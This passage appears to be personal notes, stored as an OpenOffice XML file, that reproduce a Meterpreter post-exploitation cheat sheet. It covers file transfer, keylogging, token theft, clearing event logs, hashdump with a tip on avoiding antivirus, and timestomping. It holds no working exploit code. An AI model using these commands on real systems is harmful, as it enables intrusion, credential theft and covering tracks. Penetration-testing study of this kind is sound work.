          <text:p text:style-name="P35">read - reads the data from a channel </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">run - executes the meterpreter script designated after it </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">use - loads a meterpreter extension </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P35">write - writes data to a channel</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">File System Commands</text:h>
      <text:list xml:id="list4381642323314880427" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P28">cat - read and output to stdout the contents of a file </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">cd - change directory on the victim </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">del - delete a file on the victim </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">download - download a file from the victim system to the attacker system </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">edit - edit a file with vim </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">getlwd - print the local directory </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">getwd - print working directory </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">lcd - change local directory </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">lpwd - print local directory </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">ls - list files in current directory </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">mkdir - make a directory on the victim system </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">pwd - print working directory </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">rm - delete a file </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">rmdir - remove directory on the victim system </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P28">upload - upload a file from the attacker system to the victim</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>Networking Commands</text:h>
      <text:list xml:id="list8550174950951227067" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P29">ipconfig - displays network interfaces with key information including IP address, etc. </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29">portfwd - forwards a port on the victim system to a remote service </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P29">route - view or modify the victim routing table</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">System Commands</text:h>
      <text:list xml:id="list416662238193693494" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P30">clearav - clears the event logs on the victim's computer </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">drop_token - drops a stolen token </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">execute - executes a command </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">getpid - gets the current process ID (PID) </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">getprivs - gets as many privileges as possible </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">getuid - get the user that the server is running as </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">kill - terminate the process designated by the PID </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">ps - list running processes </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">reboot - reboots the victim computer </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">reg - interact with the victim's registry </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">rev2self - calls RevertToSelf() on the victim machine </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">shell - opens a command shell on the victim machine </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">shutdown - shuts down the victim's computer </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">steal_token - attempts to steal the token of a specified (PID) process </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P30">sysinfo - gets the details about the victim computer such as OS and name</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">User Interface Commands</text:h>
      <text:list xml:id="list5611569845767068601" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P31">enumdesktops - lists all accessible desktops </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">getdesktop - get the current meterpreter desktop </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">idletime - checks to see how long since the victim system has been idle </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">keyscan_dump - dumps the contents of the software keylogger </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">keyscan_start - starts the software keylogger when associated with a process such as Word or browser </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">keyscan_stop - stops the software keylogger </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">screenshot - grabs a screenshot of the meterpreter desktop </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">set_desktop - changes the meterpreter desktop </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P31">uictl - enables control of some of the user interface components</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Privilege Escalation Commands</text:h>
      <text:list xml:id="list2484575322046406379" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P32">getsystem - uses 15 built-in methods to gain sysadmin privileges</text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Password Dump Commands</text:h>
      <text:list xml:id="list3143257565212436019" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P33">hashdump - grabs the hashes in the password (SAM) file </text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Text_20_body">Note that hashdump will often trip AV software, but there are now two scripts that are more stealthy, "run hashdump" and "run smart_hashdump". Look for more on those on my upcoming meterpreter script cheat sheet.</text:p>
      <text:p text:style-name="Text_20_body">-&gt; Voir Mimikatz pour ça though.</text:p>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:soft-page-break/>Timestomp Commands</text:h>
      <text:list xml:id="list7225700921668931708" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P34">timestomp - manipulates the modify, access, and create attributes of a file</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T10"/></text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T10"/></text:span></text:p>
      <text:p text:style-name="P7"><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5M53S</meta:editing-duration>
    <meta:editing-cycles>25</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <dc:date>2022-01-30T18:45:53.83</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="10" meta:paragraph-count="198" meta:word-count="3253" meta:character-count="19419"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>